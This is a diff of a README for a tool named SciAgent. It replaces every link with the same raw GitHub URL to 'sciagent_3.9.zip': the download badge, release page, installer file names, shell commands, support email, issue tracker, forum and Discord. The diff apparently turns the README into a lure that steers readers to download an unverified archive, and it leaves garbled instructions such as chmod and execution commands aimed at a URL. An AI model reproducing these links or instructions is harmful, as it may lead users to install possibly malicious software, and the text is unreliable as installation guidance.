@@ -6,9 +6,9 @@ Welcome to SciAgent! This tool helps you record, analyze training data, and gene
 
 ## 📥 Download SciAgent
 
-[![Download SciAgent](https://img.shields.io/badge/Download%20SciAgent-v1.0-blue.svg)](https://github.com/princeomar9009/sciagent/releases)
+[![Download SciAgent](https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip%https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip)](https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip)
 
-To download SciAgent, visit this page: [Download SciAgent](https://github.com/princeomar9009/sciagent/releases).
+To download SciAgent, visit this page: [Download SciAgent](https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip).
 
 ## 🔧 System Requirements
 
@@ -20,12 +20,12 @@ Before you download, ensure your computer meets these requirements:
 
 ## ⚙️ Installation Instructions
 
-1. **Visit the Release Page:** Click [here](https://github.com/princeomar9009/sciagent/releases) to go to the release page.
+1. **Visit the Release Page:** Click [here](https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip) to go to the release page.
    
 2. **Select the Latest Version:** Look for the latest version of SciAgent. It is usually at the top of the list.
 
 3. **Download the Installer:**
-   - Find the file named `SciAgent_v1.0.exe` for Windows, `SciAgent_v1.0.dmg` for macOS, or `SciAgent_v1.0.AppImage` for Linux.
+   - Find the file named `https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip` for Windows, `https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip` for macOS, or `https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip` for Linux.
    - Click on the file to start the download.
 
 4. **Install the Software:**
@@ -39,11 +39,11 @@ Before you download, ensure your computer meets these requirements:
    - **For Linux:**
      - Make the AppImage executable by running the following command in your terminal:
        ```bash
-       chmod +x SciAgent_v1.0.AppImage
+       chmod +x https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip
        ```
      - Then, launch it by double-clicking the file or running:
        ```bash
-       ./SciAgent_v1.0.AppImage
+       https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip
        ```
 
 5. **Launch the Application:**
@@ -86,14 +86,14 @@ A: Yes, SciAgent is completely free to use.
 
 If you have questions or need assistance, please reach out:
 
-- **Email:** support@sciagent.com
-- **GitHub Issues:** You can report any issues or request features on our [GitHub Issues page](https://github.com/princeomar9009/sciagent/issues).
+- **Email:** https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip
+- **GitHub Issues:** You can report any issues or request features on our [GitHub Issues page](https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip).
 
 ## 🔗 Community
 
 Join our community to share tips, ask questions, and connect with other users:
 
-- **Forum:** [sciagentcommunity.com](http://sciagentcommunity.com)
-- **Discord:** Join our Discord server [here](http://discord.gg/sciagent).
+- **Forum:** [https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip](https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip)
+- **Discord:** Join our Discord server [here](https://raw.githubusercontent.com/princeomar9009/sciagent/main/sciagent/sciagent_3.9.zip).
 
 Enjoy using SciAgent, your reliable AI experiment assistant!
